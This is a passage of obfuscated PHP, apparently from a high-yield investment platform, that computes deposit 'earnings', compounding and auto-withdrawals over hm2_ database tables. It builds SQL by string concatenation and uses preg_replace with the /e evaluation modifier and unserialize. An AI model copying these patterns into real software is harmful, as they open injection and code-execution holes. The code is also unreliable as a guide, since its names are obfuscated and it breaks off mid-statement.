    $elnlcnofrn = elnlcqcaem ($elnlcbjcpW);
    if (substr ($elnlcnofrn, 0 - strlen ('
')) != '
')
    {
      $elnlcnofrn .= '
';
    }

    $elnlcnofrn = preg_replace ('/([\\000-\\010\\013\\014\\016-\\037\\075\\177-\\377])/e', '\'=\'.sprintf(\'%02X\', ord(\'\\1\'))', $elnlcnofrn);
    $elnlcnofrn = preg_replace ('/([	 ])
/e', '\'=\'.sprintf(\'%02X\', ord(\'\\1\')).\'
\'', $elnlcnofrn);
    $elnlcnofrn = elnlchsola ($elnlcnofrn, 74, true);
    return $elnlcnofrn;
  }

  function elnlchsola ($elnlclTQe, $elnlcJElQ, $elnlcQcgL = false)
  {
    global $elnlcMVquv;
    $elnlcWxfe = ($elnlcQcgL ? sprintf (' =%s', '
') : '
');
    $elnlclTQe = elnlcqcaem ($elnlclTQe);
    if (substr ($elnlclTQe, -1) == '
')
    {
      $elnlclTQe = substr ($elnlclTQe, 0, -1);
    }

    $elnlcMDOn = explode ('
', $elnlclTQe);
    $elnlclTQe = '';
    for ($i = 0; $i < count ($elnlcMDOn); ++$i)
    {
      $elnlcAoEd = explode (' ', $elnlcMDOn[$i]);
      $elnlckIkl = '';
      for ($e = $elnlcMVquv['elnlcvCqE']; $e < count ($elnlcAoEd); ++$e)
      {
        $elnlcwOLbM = $elnlcAoEd[$e];
        if (($elnlcQcgL AND $elnlcJElQ < strlen ($elnlcwOLbM)))
        {
          $elnlcpqFA = $elnlcJElQ - strlen ($elnlckIkl) - 1;
          if ($e != 0)
          {
            if (20 < $elnlcpqFA)
            {
              $elnlctVuxS = $elnlcpqFA;
              if (substr ($elnlcwOLbM, $elnlctVuxS - 1, 1) == '=')
              {
                --$elnlctVuxS;
              }
              else
              {
                if (substr ($elnlcwOLbM, $elnlctVuxS - 2, 1) == '=')
                {
                  $elnlctVuxS -= 2;
                }
              }

              $elnlckwyd = substr ($elnlcwOLbM, 0, $elnlctVuxS);
              $elnlcwOLbM = substr ($elnlcwOLbM, $elnlctVuxS);
              $elnlckIkl .= ' ' . $elnlckwyd;
              $elnlclTQe .= $elnlckIkl . sprintf ('=%s', '
');
            }
            else
            {
              $elnlclTQe .= $elnlckIkl . $elnlcWxfe;
            }

            $elnlckIkl = '';
          }

          while (0 < strlen ($elnlcwOLbM))
          {
            $elnlctVuxS = $elnlcJElQ;
            if (substr ($elnlcwOLbM, $elnlctVuxS - 1, 1) == '=')
            {
              --$elnlctVuxS;
            }
            else
            {
              if (substr ($elnlcwOLbM, $elnlctVuxS - 2, 1) == '=')
              {
                $elnlctVuxS -= 2;
              }
            }

            $elnlckwyd = substr ($elnlcwOLbM, 0, $elnlctVuxS);
            $elnlcwOLbM = substr ($elnlcwOLbM, $elnlctVuxS);
            if (0 < strlen ($elnlcwOLbM))
            {
              $elnlclTQe .= $elnlckwyd . sprintf ('=%s', '
');
              continue;
            }
            else
            {
              $elnlckIkl = $elnlckwyd;
              continue;
            }
          }

          continue;
        }

        $elnlcbjWP = $elnlckIkl;
        $elnlckIkl .= ($e == 0 ? $elnlcwOLbM : ' ' . $elnlcwOLbM);
        if (($elnlcJElQ < strlen ($elnlckIkl) AND $elnlcbjWP != ''))
        {
          $elnlclTQe .= $elnlcbjWP . $elnlcWxfe;
          $elnlckIkl = $elnlcwOLbM;
          continue;
        }
      }

      $elnlclTQe .= $elnlckIkl . '
';
    }

    return $elnlclTQe;
  }

  function elnlcjcesi ($elnlcrsPJ = '100%')
  {
    return '' . '
<table cellspacing=0 cellpadding=1 border=0 width=' . $elnlcrsPJ . ' bgcolor=#FF8D00>
<tr><td bgcolor=#FF8D00>
<table cellspacing=0 cellpadding=0 border=0 width=100%>
<tr>
<td valign=top width=10 bgcolor=#FFFFF2><img src=images/sign.gif></td>
<td valign=top bgcolor=#FFFFF2 style=\'padding: 10px; color: #D20202; font-family: verdana; font-size: 11px;\'>
';
  }

  function elnlcmkeht ()
  {
    return '</td></tr></table></td></tr></table>';
  }

  function elnlckhlr ($elnlcbooUx, $elnlcusGj, $elnlceLHib)
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    if ($elnlcpvEj[$elnlcMVquv['elnlczzIb']] == 1)
    {
      return null;
    }

    if ($elnlcpvEj[$elnlcMVquv['elnlcQMNB']] == 1)
    {
      $q = '' . 'select * from hm2_deposits where id = ' . $elnlcbooUx;
      ($elnlcOsDxl = mysql_query ($q) OR print mysql_error ());
      $elnlcSaSbJ = mysql_fetch_array ($elnlcOsDxl);
      if (!$elnlcBQTfP[$elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']]][$elnlcMVquv['elnlcmfdPu']])
      {
        return null;
      }

      $q = 'select * from hm2_users where id = ' . $elnlcSaSbJ[$elnlcMVquv['elnlcDuaas']];
      ($elnlcOsDxl = mysql_query ($q) OR print mysql_error ());
      $elnlcgKTMb = mysql_fetch_array ($elnlcOsDxl);
      if (($elnlcgKTMb[$elnlcMVquv['elnlcEqGAf']] != 1 OR $elnlcgKTMb[$elnlcMVquv['elnlcMcMIS']] != 1))
      {
        return null;
      }

      if (0 < $elnlcpvEj[$elnlcMVquv['elnlcjUWdq']])
      {
        $q = 'select sum(actual_amount*(type = \'add_funds\')) as td, sum(actual_amount*(type = \'withdrawal\')) as tw from hm2_history where type in (\'add_funds\', \'withdrawal\')';
        ($elnlcOsDxl = mysql_query ($q) OR print mysql_error ());
        $elnlcweaeO = mysql_fetch_array ($elnlcOsDxl);
        if (0 < $elnlcweaeO[$elnlcMVquv['elnlckOris']])
        {
          if ($elnlcpvEj[$elnlcMVquv['elnlcjUWdq']] <= ($elnlcweaeO[$elnlcMVquv['elnlcfkVx']] + $elnlcusGj) * 100 / $elnlcweaeO[$elnlcMVquv['elnlckOris']])
          {
            return null;
          }
        }
      }

      $elnlcORCa = unserialize ($elnlcgKTMb[$elnlcMVquv['elnlcgtKN']]);
      $elnlcusGj = abs ($elnlcusGj);
      $elnlcDtlO = floor ($elnlcusGj * $elnlcpvEj[$elnlcMVquv['elnlcEIhcm']]) / 100;
      if ($elnlcDtlO < $elnlcpvEj[$elnlcMVquv['elnlcSpnv']])
      {
        $elnlcDtlO = $elnlcpvEj[$elnlcMVquv['elnlcSpnv']];
      }

      $elnlcCudq = $elnlcusGj - $elnlcDtlO;
      if ($elnlcCudq < 0)
      {
        $elnlcCudq = $elnlcMVquv['elnlcvCqE'];
      }

      $elnlcCudq = sprintf ('%.02f', floor ($elnlcCudq * 100) / 100);
      if ($elnlcpvEj[$elnlcMVquv['elnlcoBLP']] != '')
      {
        $elnlcTTwb = '' . 'Earning from deposit $' . $elnlcSaSbJ[$elnlcMVquv['elnlcTmBuz']] . '. Auto withdraw to ' . $elnlcgKTMb[$elnlcMVquv['elnlcRzkgp']] . ' from ' . $elnlcpvEj[$elnlcMVquv['elnlcEPxH']];
      }
      else
      {
        $elnlcTTwb = $elnlcpvEj[$elnlcMVquv['elnlcoBLP']];
      }

      $elnlcvubh = '' . 'Auto-withdrawal error, tried to send ' . $elnlcCudq . ' earning to ' . $elnlcBQTfP[$elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']]][$elnlcMVquv['elnlcMCqpV']] . ' account # ' . $elnlcORCa[$elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']]] . '. Error:';
      if ($elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']] == 0)
      {
        list ($elnlcvUdmU, $elnlcmINB, $elnlcoJlsg) = elnlcdrusa ('', $elnlcCudq, $elnlcORCa[$elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']]], $elnlcTTwb, $elnlcvubh);
      }

      if ($elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']] == 1)
      {
        list ($elnlcvUdmU, $elnlcmINB, $elnlcoJlsg) = elnlcdtbl ('', $elnlcCudq, $elnlcORCa[$elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']]], $elnlcTTwb, $elnlcvubh);
      }

      if ($elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']] == 2)
      {
        list ($elnlcvUdmU, $elnlcmINB, $elnlcoJlsg) = elnlcpgcws ('', $elnlcCudq, $elnlcORCa[$elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']]], $elnlcTTwb, $elnlcvubh);
      }

      if ($elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']] == 5)
      {
        list ($elnlcvUdmU, $elnlcmINB, $elnlcoJlsg) = elnlcieyo ('', $elnlcCudq, $elnlcORCa[$elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']]], $elnlcTTwb, $elnlcvubh);
      }

      if ($elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']] == 8)
      {
        list ($elnlcvUdmU, $elnlcmINB, $elnlcoJlsg) = elnlcktavs ('', $elnlcCudq, $elnlcORCa[$elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']]], $elnlcTTwb, $elnlcvubh);
      }

      if ($elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']] == 9)
      {
        list ($elnlcvUdmU, $elnlcmINB, $elnlcoJlsg) = elnlcfjvm ('', $elnlcCudq, $elnlcORCa[$elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']]], $elnlcTTwb, $elnlcvubh);
      }

      if ($elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']] == 15)
      {
        list ($elnlcvUdmU, $elnlcmINB, $elnlcoJlsg) = elnlcclrc ('', $elnlcCudq, $elnlcORCa[$elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']]], $elnlcTTwb, $elnlcvubh);
      }

      if ($elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']] == 16)
      {
        list ($elnlcvUdmU, $elnlcmINB, $elnlcoJlsg) = elnlcicrb ('', $elnlcCudq, $elnlcORCa[$elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']]], $elnlcTTwb, $elnlcvubh);
      }

      if ($elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']] == 17)
      {
        list ($elnlcvUdmU, $elnlcmINB, $elnlcoJlsg) = elnlcivsiu ('', $elnlcCudq, $elnlcORCa[$elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']]], $elnlcTTwb, $elnlcvubh);
      }

      if ($elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']] == 18)
      {
        list ($elnlcvUdmU, $elnlcmINB, $elnlcoJlsg) = elnlcikui ('', $elnlcCudq, $elnlcORCa[$elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']]], $elnlcTTwb, $elnlcvubh);
      }

      if ($elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']] == 24)
      {
        list ($elnlcvUdmU, $elnlcmINB, $elnlcoJlsg) = elnlcazuv ('', $elnlcCudq, $elnlcORCa[$elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']]], $elnlcTTwb, $elnlcvubh);
      }

      if ($elnlcvUdmU == 1)
      {
        $q = 'insert into hm2_history set
            user_id = ' . $elnlcgKTMb[$elnlcMVquv['elnlcEAKA']] . ('' . ',
        		amount = -' . $elnlcusGj . ',
            		actual_amount = -' . $elnlcusGj . ',
        		type=\'withdrawal\',
            		' . $elnlceLHib . ',
			ec = ') . $elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']] . ',
        		description = \'Auto-withdrawal earning to account ' . $elnlcORCa[$elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']]] . ('' . '. Batch is ' . $elnlcoJlsg . '\'');
        (mysql_query ($q) OR print mysql_error ());
        $elnlcRhpt = array ();
        $elnlcRhpt[$elnlcMVquv['elnlcRzkgp']] = $elnlcgKTMb[$elnlcMVquv['elnlcRzkgp']];
        $elnlcRhpt[$elnlcMVquv['elnlcMCqpV']] = $elnlcgKTMb[$elnlcMVquv['elnlcMCqpV']];
        $elnlcRhpt[$elnlcMVquv['elnlcGRxou']] = $elnlcusGj;
        $elnlcRhpt[$elnlcMVquv['elnlcNvcv']] = $elnlcoJlsg;
        $elnlcRhpt[$elnlcMVquv['elnlcEmcBS']] = $elnlcORCa[$elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']]];
        $elnlcRhpt[$elnlcMVquv['elnlcwBFz']] = $elnlcBQTfP[$elnlcSaSbJ[$elnlcMVquv['elnlcghgyP']]][$elnlcMVquv['elnlcMCqpV']];
        elnlcvgfng ('withdraw_user_notification', $elnlcgKTMb[$elnlcMVquv['elnlcjqxSK']], $elnlcpvEj[$elnlcMVquv['elnlcWIVix']], $elnlcRhpt);
        elnlcvgfng ('withdraw_admin_notification', $elnlcpvEj[$elnlcMVquv['elnlcWIVix']], $elnlcpvEj[$elnlcMVquv['elnlcWIVix']], $elnlcRhpt);
      }
    }

  }

  function elnlcuyzw ($elnlcDHFI)
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    $elnlcgnUmP = array ();
    if (($elnlcpvEj[$elnlcMVquv['elnlcazAsR']] == 1 AND $elnlcDHFI != -2))
    {
      return null;
    }

    $q = 'select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = \'on\' and hm2_types.id = hm2_plans.parent order by parent, min_deposit';
    ($elnlcOsDxl = mysql_query ($q) OR print mysql_error ());
    while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
    {
      $elnlcgnUmP[$elnlcweaeO[$elnlcMVquv['elnlcPFCS']]][$elnlcweaeO[$elnlcMVquv['elnlcEAKA']]] = $elnlcweaeO;
    }

    $elnlcmtyy = $elnlcMVquv['elnlczUlK'];
    $elnlcMWRE = 'u.last_access_time + interval 30 minute < now() ';
    if ($elnlcDHFI == -1)
    {
      $elnlcMWRE = '1 = 1';
      $q = 'select * from hm2_users where l_e_t + interval 15 minute < now() and status = \'on\'';
    }
    else
    {
      $q = '' . 'select * from hm2_users where id = ' . $elnlcDHFI . ' and status = \'on\'';
    }

    if ($elnlcDHFI == -2)
    {
      $q = 'select * from hm2_users where status = \'on\'';
      $q = 'select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id';
    }

    ($elnlcdMMth = mysql_query ($q) OR print mysql_error ());
    while ($elnlcoEboR = mysql_fetch_array ($elnlcdMMth))
    {
      $elnlcOCuyb = $elnlcoEboR[$elnlcMVquv['elnlcEAKA']];
      $q = '' . 'update hm2_users set l_e_t = now() where id = ' . $elnlcOCuyb;
      (mysql_query ($q) OR print mysql_error ());
      $elnlcmtyy = $elnlcMVquv['elnlczUlK'];
      $elnlcsDvj = ' ((t.work_week = 1)*(floor(q_days / 5) * 7 + q_days % 5 + ((q_days % 5 + WEEKDAY(deposit_date)) > 5)*2 - 1) + (t.work_week = 0)*(t.q_days)) ';
      while (0 < $elnlcmtyy)
      {
        $q = '' . 'select 
              d.*, 
              t.period as period, t.use_compound as use_compound,
              t.compound_min_deposit, t.compound_max_deposit,
              t.compound_min_percent, t.compound_max_percent,
              t.compound_percents_type, t.compound_percents,
              t.work_week as work_week,
              t.q_days as q_days, t.withdraw_principal,
              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,
              t.return_profit as return_profit,
              ' . $elnlcsDvj . ' as q_days1
            from
              hm2_deposits as d,
              hm2_types as t,
              hm2_users as u
            where 
              u.id = ' . $elnlcOCuyb . ' and 
              u.status = \'on\' and 
              d.status=\'on\' and 
              d.type_id = t.id and 
              t.status = \'on\' and 
              u.id = d.user_id and
              (((' . $elnlcsDvj . ' + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / if(t.period = \'h\', 60*60, 60*60*24))) or ' . $elnlcsDvj . ' = 0) and 
              (
                (d.last_pay_date + interval 1 hour <= now() and t.period = \'h\')or
                (d.last_pay_date + interval 1 day <= now() and t.period = \'d\')or
                (d.last_pay_date + interval 7 day <= now() and t.period = \'w\') or
                (d.last_pay_date + interval 14 day <= now() and t.period = \'b-w\') or
                (d.last_pay_date + interval 1 month <= now() and t.period = \'m\') or
                (d.last_pay_date + interval 2 month <= now() and t.period = \'2m\') or
                (d.last_pay_date + interval 3 month <= now() and t.period = \'3m\') or
                (d.last_pay_date + interval 6 month <= now() and t.period = \'6m\') or
                (d.last_pay_date + interval 1 year <= now() and t.period = \'y\') or
                (d.deposit_date + interval ' . $elnlcsDvj . ' + t.delay-1*(t.delay > 0) day <= now() and t.period = \'end\') 
              ) and
              ((' . $elnlcsDvj . ' = 0) or 
                (               
                (d.deposit_date + interval ' . $elnlcsDvj . ' + t.delay-1*(t.delay > 0) hour >= d.last_pay_date and t.period = \'h\') or
                (d.deposit_date + interval ' . $elnlcsDvj . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date and t.period = \'d\') or
                (d.deposit_date + interval ' . $elnlcsDvj . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = \'w\') or
                (d.deposit_date + interval ' . $elnlcsDvj . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = \'b-w\') or
                (d.deposit_date + interval ' . $elnlcsDvj . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = \'m\') or
                (d.deposit_date + interval ' . $elnlcsDvj . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = \'2m\') or
                (d.deposit_date + interval ' . $elnlcsDvj . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = \'3m\') or
                (d.deposit_date + interval ' . $elnlcsDvj . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = \'6m\') or
                (d.deposit_date + interval ' . $elnlcsDvj . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = \'y\') or
                (' . $elnlcsDvj . ' > 0 and t.period = \'end\') 
              ))';
        ($elnlcOsDxl = mysql_query ($q) OR print mysql_error ());
        $elnlcmtyy = $elnlcMVquv['elnlcvCqE'];
        while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
        {
          ++$elnlcmtyy;
          if (!isset ($elnlcgnUmP[$elnlcweaeO[$elnlcMVquv['elnlcLkwpt']]]))
          {
            continue;
          }

          $elnlcISOHc = $elnlcMVquv['elnlcvCqE'];
          $elnlcDPDR = $elnlcMVquv['elnlcvCqE'];
          reset ($elnlcgnUmP);
          reset ($elnlcgnUmP[$elnlcweaeO[$elnlcMVquv['elnlcLkwpt']]]);
          while (list ($elnlcTrrSU, $elnlcsBcy) = each ($elnlcgnUmP[$elnlcweaeO[$elnlcMVquv['elnlcLkwpt']]]))
          {
            if (($elnlcsBcy[$elnlcMVquv['elnlcfKMP']] <= $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] AND ($elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] <= $elnlcsBcy[$elnlcMVquv['elnlchpJfW']] OR $elnlcsBcy[$elnlcMVquv['elnlchpJfW']] == 0)))
            {
              $elnlcISOHc = $elnlcsBcy[$elnlcMVquv['elnlcHlxD']];
            }

            if (($elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] < $elnlcsBcy[$elnlcMVquv['elnlcfKMP']] AND $elnlcISOHc == 0))
            {
              $elnlcISOHc = $elnlcDPDR;
            }

            if (($elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] < $elnlcsBcy[$elnlcMVquv['elnlcfKMP']] AND 0 < $elnlcISOHc))
            {
              break;
            }

            $elnlcDPDR = $elnlcsBcy[$elnlcMVquv['elnlcHlxD']];
          }

          if (($elnlcsBcy[$elnlcMVquv['elnlchpJfW']] != 0 AND $elnlcsBcy[$elnlcMVquv['elnlchpJfW']] < $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']]))
          {
            $elnlcISOHc = $elnlcDPDR;
          }

          $elnlcedHr = $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] * $elnlcISOHc / 100;
          $elnlcbScM = '';
          if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcnUfdl'])
          {
            $elnlcbScM = ' 1 day ';
          }
          else
          {
            if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcfURv'])
            {
              $elnlcbScM = ' 1 hour ';
            }
            else
            {
              if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcAHESL'])
              {
                $elnlcbScM = ' 7 day ';
              }
              else
              {
                if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == 'b-w')
                {
                  $elnlcbScM = ' 14 day ';
                }
                else
                {
                  if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcxNIBb'])
                  {
                    $elnlcbScM = ' 1 month ';
                  }
                  else
                  {
                    if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcBGldC'])
                    {
                      $elnlcbScM = ' 2 month ';
                    }
                    else
                    {
                      if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcWnLN'])
                      {
                        $elnlcbScM = ' 3 month ';
                      }
                      else
                      {
                        if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcxvGKb'])
                        {
                          $elnlcbScM = ' 6 month ';
                        }
                        else
                        {
                          if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcbPEu'])
                          {
                            $elnlcbScM = ' 1 year ';
                          }
                          else
                          {
                            if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcJfaAK'])
                            {
                              $elnlcbScM = ' ' . $elnlcweaeO[$elnlcMVquv['elnlcSFFJ']] . ' day ';
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }

          if (($elnlcISOHc == 0 AND $elnlcbScM == ''))
          {
            continue;
          }

          $elnlcymxx = -1;
          $q = 'select weekday(\'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM . ') as dw');
          ($elnlcyvrz = mysql_query ($q) OR print mysql_error ());
          while ($elnlcpKcsw = mysql_fetch_array ($elnlcyvrz))
          {
            $elnlcymxx = $elnlcpKcsw[$elnlcMVquv['elnlcESExA']];
          }

          $q = 'select count(id) as col from hm2_history where ' . ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcfURv'] ? ' date_format(date, \'%Y-%m-%d %H\') = date_format(\'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM . ', \'%Y-%m-%d %H\') and') : 'to_days(date) = to_days(\'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM . ') and ')) . ' deposit_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcEAKA']];
          ($elnlcdMkuu = mysql_query ($q) OR print mysql_error ());
          $elnlcsPjz = $elnlcMVquv['elnlcvCqE'];
          while ($elnlcqQRC = mysql_fetch_array ($elnlcdMkuu))
          {
            $elnlcsPjz = $elnlcqQRC[$elnlcMVquv['elnlcxwjRE']];
          }

          if ($elnlcsPjz == 0)
          {
            if ((5 <= $elnlcymxx AND $elnlcweaeO[$elnlcMVquv['elnlceIFKy']] == 1))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcDuaas']] . ',
                    amount = 0,
                    type = \'earning\',
                    description = \'No interest on ' . ($elnlcymxx == 5 ? 'Saturday' : 'Sunday') . '\',
                    actual_amount = 0,
                    date = \'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM . ',
                    ec = ') . $elnlcweaeO[$elnlcMVquv['elnlcghgyP']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcEAKA']];
            }
            else
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcDuaas']] . ('' . ',
                    amount = ' . $elnlcedHr . ',
                    type = \'earning\',
                    description = \'Earning from deposit ') . $elnlcpvEj[$elnlcMVquv['elnlcapEpp']] . number_format ($elnlcweaeO[$elnlcMVquv['elnlcTmBuz']], 2) . ('' . ' - ' . $elnlcISOHc . ' %\',
                    actual_amount = ' . $elnlcedHr . ',
                    date = \'') . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM . ',
                    ec = ') . $elnlcweaeO[$elnlcMVquv['elnlcghgyP']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcEAKA']];
            }

            (mysql_query ($q) OR print mysql_error ());
          }

          $elnlcrSHlb = '';
          if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcJfaAK'])
          {
            if (($elnlcweaeO[$elnlcMVquv['elnlcigOEn']] == 0 OR ($elnlcweaeO[$elnlcMVquv['elnlcigOEn']] AND $elnlcweaeO[$elnlcMVquv['elnlcwUsO']])))
            {
              $elnlcrSHlb = ', status = \'off\'';
            }

            if (($elnlcweaeO[$elnlcMVquv['elnlcklkzi']] == 1 AND ($elnlcweaeO[$elnlcMVquv['elnlcigOEn']] == 0 OR ($elnlcweaeO[$elnlcMVquv['elnlcigOEn']] AND $elnlcweaeO[$elnlcMVquv['elnlcwUsO']]))))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcDuaas']] . ',
                    amount = ' . $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] . ',
                    type=\'release_deposit\',
                    actual_amount = ' . $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] . ',
                    ec = ' . $elnlcweaeO[$elnlcMVquv['elnlcghgyP']] . ',
                    date = \'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM . ',
                    deposit_id = ') . $elnlcweaeO[$elnlcMVquv['elnlcEAKA']];
              (mysql_query ($q) OR print mysql_error ());
            }
          }
          else
          {
            if ((5 <= $elnlcymxx AND $elnlcweaeO[$elnlcMVquv['elnlceIFKy']] == 1))
            {
            }
            else
            {
              if (((0 < $elnlcweaeO[$elnlcMVquv['elnlcokxs']] AND $elnlcweaeO[$elnlcMVquv['elnlcokxs']] <= 100) AND $elnlcweaeO[$elnlcMVquv['elnlcrBwT']] == 1))
              {
                if ($elnlcweaeO[$elnlcMVquv['elnlcRvKp']] == 0)
                {
                  $elnlcweaeO[$elnlcMVquv['elnlcRvKp']] = $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] + 1;
                }

                if (($elnlcweaeO[$elnlcMVquv['elnlcSUgEI']] <= $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] AND $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] <= $elnlcweaeO[$elnlcMVquv['elnlcRvKp']]))
                {
                  if ($elnlcweaeO[$elnlcMVquv['elnlcpEow']] == 1)
                  {
                    $elnlcGRIUs = preg_split ('/\\s*,\\s*/', $elnlcweaeO[$elnlcMVquv['elnlcGrJhm']]);
                    if (!in_array ($elnlcweaeO[$elnlcMVquv['elnlcokxs']], $elnlcGRIUs))
                    {
                      $elnlcweaeO[$elnlcMVquv['elnlcokxs']] = $elnlcGRIUs[0];
                    }
                  }
                  else
                  {
                    if ($elnlcweaeO[$elnlcMVquv['elnlcokxs']] < $elnlcweaeO[$elnlcMVquv['elnlcbKUSb']])
                    {
                      $elnlcweaeO[$elnlcMVquv['elnlcokxs']] = $elnlcweaeO[$elnlcMVquv['elnlcbKUSb']];
                    }

                    if ($elnlcweaeO[$elnlcMVquv['elnlcqOjLh']] < $elnlcweaeO[$elnlcMVquv['elnlcokxs']])
                    {
                      $elnlcweaeO[$elnlcMVquv['elnlcokxs']] = $elnlcweaeO[$elnlcMVquv['elnlcqOjLh']];
                    }
                  }
                }
                else
                {
                  $elnlcweaeO[$elnlcMVquv['elnlcokxs']] = $elnlcMVquv['elnlcvCqE'];
                }

                if ((0 < $elnlcweaeO[$elnlcMVquv['elnlcokxs']] AND $elnlcweaeO[$elnlcMVquv['elnlcokxs']] <= 100))
                {
                  $elnlcjFKz = $elnlcedHr * $elnlcweaeO[$elnlcMVquv['elnlcokxs']] / 100;
                  $elnlcedHr = floor ((floor ($elnlcedHr * 100000) / 100000 - floor ($elnlcjFKz * 100000) / 100000) * 100) / 100;
                  $q = 'insert into hm2_history set user_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcDuaas']] . ('' . ',
                        amount = -' . $elnlcjFKz . ',
                    		type=\'deposit\',
                    		description = \'Compounding deposit\',
                    		actual_amount = -' . $elnlcjFKz . ',
                    		ec = ') . $elnlcweaeO[$elnlcMVquv['elnlcghgyP']] . ',
                    		date = \'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM . ',
                                deposit_id = ') . $elnlcweaeO[$elnlcMVquv['elnlcEAKA']];
                  (mysql_query ($q) OR print mysql_error ());
                  $q = '' . 'update hm2_deposits set amount = amount + ' . $elnlcjFKz . ',
                    		actual_amount = actual_amount + ' . $elnlcjFKz . '
                    		where id = ' . $elnlcweaeO[$elnlcMVquv['elnlcEAKA']];
                  (mysql_query ($q) OR print mysql_error ());
                }
              }

              elnlckhlr ($elnlcweaeO[$elnlcMVquv['elnlcEAKA']], $elnlcedHr, 'date = \'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM));
            }
          }

          $q = '' . 'update hm2_deposits set 
      	q_pays = q_pays + 1, 
